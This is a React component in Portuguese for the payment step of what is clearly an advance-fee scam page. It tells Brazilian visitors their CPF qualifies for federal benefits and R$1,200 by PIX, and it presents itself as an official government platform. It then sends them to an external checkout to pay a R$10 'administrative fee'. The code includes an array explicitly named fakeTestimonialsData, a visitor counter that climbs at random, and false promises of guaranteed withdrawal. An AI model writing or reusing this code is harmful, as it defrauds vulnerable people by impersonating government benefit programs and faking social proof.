
"use client";

import type React from 'react';
import { useState, useEffect, FC, useRef } from 'react';
import Image from 'next/image';
import { Button } from '@/components/ui/button';
import { CheckCircle, TrendingUp, ShieldCheck, Users } from 'lucide-react'; 

interface OfferStepProps {
  cpf: string | null;
}

interface Testimonial {
  name: string;
  location: string;
  text: string;
  photoUrl?: string;
  dataAiHint?: string;
}

const fakeTestimonialsData: Testimonial[] = [
   {
    name: "MARIA S.",
    location: "Fortaleza/CE",
    text: "Paguei a taxa com o <strong>CU NA MÃO</strong>, mas para minha surpresa... <strong>CAIU NA HORA!</strong> R$1.200,00 limpos na conta! Essa grana <strong>SALVOU MEU MÊS E MINHA VIDA!</strong> Simplesmente <strong>FODAA!</strong>",
    photoUrl: "https://i.imgur.com/TXZQbQo.png",
    dataAiHint: "person avatar"
  },
  {
    name: "J. COSTA",
    location: "Interior de MG",
    text: "No começo, achei que era <strong>ENGANAÇÃO TOTAL</strong>, mas arrisquei a taxa. Qual não foi minha surpresa quando vi o PIX de <strong>R$1.200,00 CAIR NA CONTA em MINUTOS!</strong> Dinheiro extra que <strong>ME TIROU DO SUFOCO!</strong> Recomendo DEMAIS!",
    photoUrl: "https://i.imgur.com/dpip9hc.png",
    dataAiHint: "person avatar"
  },
  {
    name: "ANA P.",
    location: "Salvador/BA",
    text: "Confesso que tremi na base pra pagar a taxa, achei que ia <strong>PERDER MEU DINHEIRINHO SUADO</strong>. Mas a necessidade falou mais alto. E não é que o negócio <strong>FUNCIONA MESMO?!</strong> R$1.200,00 liberados rapidinho! <strong>MELHOR INVESTIMENTO</strong> que fiz esse ano!",
    photoUrl: "https://i.imgur.com/FdL8RWB.jpeg",
    dataAiHint: "person avatar"
  },
];

const benefitsFromUserCode = [
    {
        nome: "Programa Auxílio Brasil",
        valor: "R$ 1200/mês",
        icon: "💰",
        descricao: "Benefício mensal direto na sua conta!",
    },
    {
        nome: "Tarifa Social de Energia",
        valor: "Até 65% de desconto",
        icon: "⚡",
        descricao: "Redução significativa na sua conta de luz!",
    },
    {
        nome: "Vale-Gás Federal",
        valor: "R$ 120 mensal",
        icon: "🔥",
        descricao: "Auxílio para comprar seu gás sem aperto!",
    },
    {
        nome: "Dinheiro Perdido",
        valor: "R$5000 por CPF",
        icon: "💸",
        descricao: "Valores esquecidos em contas e bancos!",
    },
];


const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
  const [peopleServed, setPeopleServed] = useState(2402);
  const [testimonials, setTestimonials] = useState<Testimonial[]>(fakeTestimonialsData);
  const taxSectionRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const interval = setInterval(() => {
      setPeopleServed(prev => prev + Math.floor(Math.random() * 5) + 1);
    }, 1500);

    const testimonialInterval = setInterval(() => {
      setTestimonials(prev => [...prev].sort(() => 0.5 - Math.random()));
    }, 8000);

    return () => {
      clearInterval(interval);
      clearInterval(testimonialInterval);
    };
  }, []);

  const scrollToTaxSection = () => {
    taxSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  const handleEligibilityCheckClick = () => {
    scrollToTaxSection();
  };

  const handleLiberarAcessoClick = () => {
    scrollToTaxSection(); // Scroll first
    // Timeout to allow scroll to be visible before alert
    setTimeout(() => {
      console.log("LIBERAR ACESSO IMEDIATO AGORA clicado! CPF:", cpf, "Redirect to R$10,00 checkout.");
      alert("🚨 ATENÇÃO: Você será redirecionado para o pagamento SEGURO da taxa administrativa de R$10,00. Liberação dos R$1.200,00 IMEDIATA após confirmação do PIX!");
      window.location.href = "https://kingspay.site/checkout/taxa-inss-2025"; 
    }, 100); // 100ms delay might be enough for the scroll to start/be noticeable
  };

  const formattedCpf = cpf || '***.***.***-**';

  return (
    <div className="w-full max-w-4xl mx-auto p-4 md:p-6 space-y-8 bg-background text-foreground font-[Arial,sans-serif]">
        
        <div className="text-center">
           <h2 className="font-headline text-xl md:text-2xl font-bold mb-2 text-foreground">
            Parabéns, seu CPF {formattedCpf} foi aprovado para receber o dinheiro e os benefícios a seguir!
          </h2>
        </div>

        {/* Benefícios disponíveis em destaque - Conforme código do usuário */}
        <div className="bg-white rounded-xl shadow-xl p-8 mb-8 border-l-8 border-green-600 animate-scale-in">
            <h2 className="text-2xl md:text-3xl font-black text-gray-800 mb-6 text-center">Acesso LIBERADO para você:</h2>
            <div className="grid md:grid-cols-3 gap-6 mb-8">
                {benefitsFromUserCode.map((beneficio, index) => (
                    <div key={index} className="bg-green-50 p-6 rounded-lg border border-green-200 shadow-md transform hover:scale-105 transition-all duration-200">
                        <div className="text-center">
                            <div className="text-4xl mb-3 animate-pulse-slow">{beneficio.icon}</div>
                            <h3 className="font-bold text-gray-800 mb-2 text-lg">{beneficio.nome}</h3>
                            <p className="text-green-700 font-black text-2xl mb-2">{beneficio.valor}</p>
                            <p className="text-sm text-gray-600">{beneficio.descricao}</p>
                            <CheckCircle className="text-green-500 mx-auto mt-3 animate-fade-in" size={24} />
                        </div>
                    </div>
                ))}
            </div>
        </div>

        {/* Nova Seção de Chamada para Ação (CTA) */}
        <div className="text-center py-[50px] px-[20px] bg-[#0056b3] rounded-lg">
          <h2 className="text-[2.2em] text-white mb-[20px] font-bold">
            Pronto para dar o Próximo Passo?
          </h2>
          <p className="text-[1.2em] text-white max-w-[700px] mx-auto mb-[30px]">
            Descubra se você se qualifica para os benefícios do Programa Jovem Cidadão Ativo e inicie sua jornada. Todo o processo é seguro, transparente e realizado via plataforma oficial do Governo Federal.
          </p>
          <button
            onClick={handleEligibilityCheckClick}
            className="bg-[#ffc107] text-[#003366] py-[18px] px-[40px] text-[1.6em] font-bold border-none rounded-[10px] cursor-pointer transition-colors duration-300 ease-linear hover:bg-[#e0a800] no-underline"
          >
            Verificar Minha Elegibilidade Agora
          </button>
          <p className="text-[0.9em] mt-[20px] text-[rgba(255,255,255,0.8)]">
            Sua segurança e privacidade são prioridade.
          </p>
        </div>
          
        {/* Seção de Preço - Mantida */}
        <div ref={taxSectionRef} className="text-center p-4 md:p-6 bg-primary/10 rounded-xl shadow-lg border-2 border-accent ring-2 ring-accent/50 space-y-2">
          <h3 className="font-headline text-xl md:text-2xl font-bold text-primary mb-1 uppercase flex items-center justify-center">
             <CheckCircle className="inline-block h-7 w-7 mr-1 text-accent" /> ÚNICA TAXA DE ACESSO!
          </h3>
          <p className="text-muted-foreground line-through text-2xl md:text-3xl mb-0">DE R$297,00</p>
          <p className="text-7xl md:text-8xl font-extrabold text-accent mb-1">
            R$10<span className="text-5xl md:text-6xl align-top">,00</span>
          </p>
          <p className="text-lg md:text-xl font-bold text-primary mb-2 uppercase">(VOCÊ ACABA DE ECONOMIZAR R$287,00 HOJE!)</p>
          <p className="text-sm md:text-md text-foreground/90 max-w-lg mx-auto">
            <strong>IMPORTANTE:</strong> Pague <strong>SOMENTE AGORA</strong> esta taxa para cobrir os custos de <strong>processamento SEGURO</strong> e <strong>liberação automática</strong> dos seus R$1.200,00 via PIX! <strong className="text-accent underline">SAQUE GARANTIDO IMEDIATAMENTE APÓS O PIX!</strong>
          </p>
        </div>

        <Button
          className="w-full h-16 md:h-20 text-lg md:text-xl font-bold bg-accent text-accent-foreground hover:bg-accent/90 shadow-xl transform hover:scale-105 transition-transform duration-150 ease-out ring-4 ring-green-300 hover:ring-green-400 whitespace-normal text-center"
          onClick={handleLiberarAcessoClick}
        >
          Quero Receber o dinheiro!
        </Button>
        <div className="text-center text-xs text-muted-foreground flex items-center justify-center">
          <ShieldCheck className="h-4 w-4 mr-1 text-green-600" /> Pagamento 100% SEGURO e Criptografado! Processado por AppMax.
        </div>
        
        {/* SEÇÃO DE PROVA SOCIAL - Mantida */}
        <div>
           <h3 className="font-headline text-lg md:text-xl font-bold text-foreground text-center mb-5 uppercase flex items-center justify-center">
            <Users className="mr-2 h-7 w-7" /> 
            PESSOAS QUE SACARAM HOJE!
          </h3>
          <div className="space-y-4">
            {testimonials.map((testimonial, index) => (
              <div key={index} className="p-4 md:p-5 bg-card shadow-lg rounded-lg border border-border">
                  <div className="flex items-start">
                      {testimonial.photoUrl && (
                          <Image
                          src={testimonial.photoUrl}
                          alt={`Foto de ${testimonial.name}`}
                          width={56} 
                          height={56}
                          data-ai-hint={testimonial.dataAiHint || "person avatar"}
                          className="rounded-full mr-4 border-2 border-accent shadow-md"
                          />
                      )}
                      <div className="flex-1">
                          <p className="font-headline text-lg font-semibold text-primary mb-1">🔥 SAQUE CONFIRMADO!</p>
                          <p className="text-sm md:text-base text-foreground italic leading-tight" dangerouslySetInnerHTML={{ __html: testimonial.text }} />
                          <p className="text-sm text-muted-foreground mt-2 font-bold">- {testimonial.name}, {testimonial.location}</p>
                          <p className="text-xs text-green-600 font-semibold mt-1">(VERIFICADO AGORA ✅)</p>
                      </div>
                  </div>
              </div>
            ))}
          </div>
          <div className="mt-10 text-center p-5 bg-primary text-primary-foreground rounded-lg shadow-xl border-2 border-yellow-300">
            <TrendingUp className="h-10 md:h-12 w-10 md:h-12 mx-auto mb-2 text-yellow-300 animate-pulse" />
            <p className="text-5xl md:text-6xl font-bold text-yellow-300">{peopleServed.toLocaleString('pt-BR')}</p>
            <p className="text-md md:text-lg font-semibold uppercase">📈 BRASILEIROS JÁ SACARAM SÓ HOJE! <span className="text-yellow-300">NÃO FIQUE PRA TRÁS!</span></p>
          </div>
        </div>
    </div>
  );
};

export default OfferStep;
    
    

    

    

    

    

    




